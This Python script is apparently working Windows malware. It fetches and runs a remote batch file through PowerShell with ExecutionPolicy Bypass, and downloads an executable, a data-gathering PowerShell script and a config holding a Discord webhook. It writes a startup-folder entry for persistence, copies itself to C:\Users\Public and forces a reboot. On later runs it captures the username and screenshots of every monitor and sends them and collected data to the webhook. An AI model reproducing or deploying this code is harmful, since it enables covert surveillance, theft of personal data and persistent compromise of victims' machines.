try:
    import hashlib
    import os
    import requests
    from tqdm import tqdm
    from urllib.parse import urlparse
    import shutil
    import win32api
    import time
    import subprocess
    import getpass
    import mss
    from pathlib import Path
except ModuleNotFoundError:
    import subprocess, sys
    subprocess.run([
        "powershell",
        "-ExecutionPolicy", "Bypass",
        "-Command",
        "iwr https://raw.githubusercontent.com/thompog/bob/main/starter.bat -OutFile starter.bat; cmd /c starter.bat"
    ])
    sys.exit(0)

CHUNK_SIZE = 1024 * 64  # 64 KB chunks for speed

class ScreenCapture:
    def __init__(self, output_dir='captures'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

    def capture_monitor(self, monitor_index=1, filename='screenshot.png'):
        """Capture a specific monitor."""
        with mss.mss() as sct:
            if monitor_index >= len(sct.monitors):
                raise ValueError(f"Monitor {monitor_index} not found")

            screenshot = sct.grab(sct.monitors[monitor_index])
            output_path = self.output_dir / filename
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=str(output_path))
            return output_path

    def capture_region(self, left, top, width, height, filename='region.png'):
        """Capture a specific region."""
        region = {'left': left, 'top': top, 'width': width, 'height': height}

        with mss.mss() as sct:
            screenshot = sct.grab(region)
            output_path = self.output_dir / filename
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=str(output_path))
            return output_path

    def list_monitors(self):
        """List available monitors."""
        with mss.mss() as sct:
            return sct.monitors

def download(url: str, dest: str = None, folder: str = None, sha256: str = None) -> str:
    filename = dest if dest else (os.path.basename(urlparse(url).path) or "downloaded_file")
    if folder:
        os.makedirs(folder, exist_ok=True)
        filename = os.path.join(folder, os.path.basename(filename))
    dest = filename
    part_path = dest + ".part"
    downloaded = os.path.getsize(part_path) if os.path.exists(part_path) else 0

    headers = {}
    if downloaded:
        headers["Range"] = f"bytes={downloaded}-"

    with requests.get(url, headers=headers, stream=True, timeout=30) as response:
        if response.status_code == 416:
            # .part file is already fully downloaded; just finalize it
            os.replace(part_path, dest)
            return dest
        if response.status_code not in (200, 206):
            response.raise_for_status()

        if response.status_code == 200 and downloaded:
            downloaded = 0

        total = downloaded + int(response.headers.get("Content-Length", 0))

        mode = "ab" if downloaded else "wb"
        with open(part_path, mode) as f, tqdm(
            total=total or None,
            initial=downloaded,
            unit="B",
            unit_scale=True,
            unit_divisor=1024,
            desc=os.path.basename(dest),
            dynamic_ncols=True,
        ) as bar:
            for chunk in response.iter_content(chunk_size=CHUNK_SIZE):
                if chunk:
                    f.write(chunk)
                    bar.update(len(chunk))

    os.replace(part_path, dest)

    if sha256:
        print("Verifying SHA-256...", end=" ")
        h = hashlib.sha256()
        with open(dest, "rb") as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
                h.update(chunk)
        actual = h.hexdigest()
        if actual.lower() != sha256.lower():
            os.remove(dest)
            raise ValueError(f"SHA-256 mismatch!\n  expected: {sha256}\n  got:      {actual}")
        print("OK")

    return dest


def start(path: str) -> None:
    path = os.path.abspath(path)
    if not os.path.exists(path):
        raise FileNotFoundError(f"File not found: {path}")
    os.startfile(path)


def read_file(path: str, **kwargs) -> str:
    """
    Read a file and strip out any substrings passed as keyword args.
    Example:
        read_file("file.txt", remove1="user", remove2=" ", remove3="=")
        # file contains: "user = tom"  →  returns "tom"
    """
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    for value in kwargs.values():
        content = content.replace(value, "")
    return content

if os.path.exists("C:\\Users\\Public\\Publlc"):
    value = "C:\\Users\\Public\\Publlc"
else:
    value = "C:\\Users\\Public"

os.chdir(value)

if not os.path.exists(f"{value}\\have_done.txt"):
    path1 = download("https://github.com/thompog/bob/raw/refs/heads/main/bomba.exe", "bomba.exe", "C:\\", "5089855E172C9DA4340FC5097E85C8B26EDBE0414CADD83660C775F298AE1FDC")
    path2 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", "getdata.ps1", "C:\\", "8BC7BA0D901A3C6818C6408B52EB022D75C50110E68519D7BCDE9473094D1EE7")
    path3 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/config.txt", "config.txt", "C:\\", "82F3F0920C5EC5DEAEDA5058D8314E800D8DE0881E2036F2C886279E6F21D808")

    nfile = read_file("C:\\config.txt", remove="webhook = https://discord.com/api/webhooks/1487128618189717606/Jh4fhNACI4jLruL64J8wIfIdC_78LbQ1AJIQSp5lCtysEpOX7fJe8_ak6tUxT5A9C6HZ", remove1="address = 0.0.0.0", remove2="port = 9000", remove3="\n", remove4="url", remove5=" ", ramove6="=")
    os.remove("C:\\config.txt")

    with open("Public Data.json", "w") as f:
        f.write({"url": nfile, "dir": value})

    with open("start_nnnnn.bat", "w") as f:
        f.write("@echo off" + "\n" + 'for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]::GetFolderPath(' + "'CommonStartup')" + '"`) do set startupPath=%%i' + "\n" + 'cd /d "%startupPath%"' + "\n" + f'echo start "" "{value}\main.py">big_starter.bat')
    
    start(f"{value}\\start_nnnnn.bat")

    ngetdata = read_file("C:\\getdata.ps1", remove="$root = Split-Path -Parent $MyInvocation.MyCommand.Path")
    os.remove("C:\\getdata.ps1")

    with open("Send Public Data.ps1", "w") as f:
        f.write(f'$root = "{value}"' + "\n" + ngetdata)

    shutil.move("C:\\bomba.exe", f"{value}\\bomba.exe")

    os.chdir(value)
    current_file = os.path.abspath(__file__)
    destination_folder = value
    os.makedirs(destination_folder, exist_ok=True)
    shutil.copy(current_file, destination_folder)

    with open("have_done.txt", "w") as f:
        f.write("a")

    win32api.InitiateSystemShutdown(bRebootAfterShutdown=True)
else:
    if os.path.exists(f"{value}\\done.txt"):
        os.remove(f"{value}\\done.txt")

    start(f"{value}\\Send Public Data.ps1")

    while not os.path.exists(f"{value}\\done.txt"):
        time.sleep(5)
    
    url = read_file(f"{value}\\Public Data.json", remove="{", remove2="}", remove3='"url":', remove4=f'"dir": {value}', remove5=",", remove6=" ", remove7="\n")

    try:
        username = getpass.getuser()
    except OSError:
        username = "cant find user"

    subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"got a user {username}"', "-user", f'"{username}"'])

    capture = ScreenCapture()
    monitors = capture.list_monitors()
    for i in range(len(monitors)):
        mama = capture.capture_monitor(i, f'monitor{i}.png')
        subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"heres photos..."', "-user", f'"{username}"', "-photo", f"{mama}"])

    subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, '-json', '-path', f'{value}\info.json'])
